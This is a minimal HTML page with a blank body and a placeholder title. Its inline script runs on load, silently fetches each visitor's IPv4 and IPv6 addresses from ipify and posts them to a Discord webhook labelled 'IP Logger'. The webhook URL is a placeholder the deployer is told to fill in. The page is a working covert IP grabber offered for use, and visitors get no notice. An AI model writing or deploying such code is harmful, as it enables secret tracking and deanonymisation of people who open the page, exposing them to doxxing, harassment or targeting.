<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>title</title>
</head>
<body>
  <script>
    // Function to fetch IP address from a given URL
    async function fetchIP(url) {
      try {
        const response = await fetch(url);
        if (!response.ok) throw new Error("Failed to fetch");
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return null;
      }
    }

    // Function to send IP addresses to a Discord webhook
    async function logToDiscord(ipv4, ipv6) {
      const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Replace with your Discord webhook URL
      const payload = {
        username: "IP Logger",
        embeds: [{
          title: "New Visitor IP Logged",
          color: 16711680,
          fields: [
            { name: "IPv4", value: ipv4 || "Not available", inline: true },
            { name: "IPv6", value: ipv6 || "Not available", inline: true }
          ],
          footer: { text: "IP Detection System" },
          timestamp: new Date().toISOString()
        }]
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (error) {
        console.error("Error sending webhook:", error);
      }
    }

    // Fetch IP addresses and log them to Discord
    async function init() {
      const ipv4 = await fetchIP("https://api.ipify.org?format=json");
      const ipv6 = await fetchIP("https://api64.ipify.org?format=json");

      // Log the fetched IPs to the Discord webhook
      await logToDiscord(ipv4, ipv6);
    }

    init();
  </script>
</body>
</html>
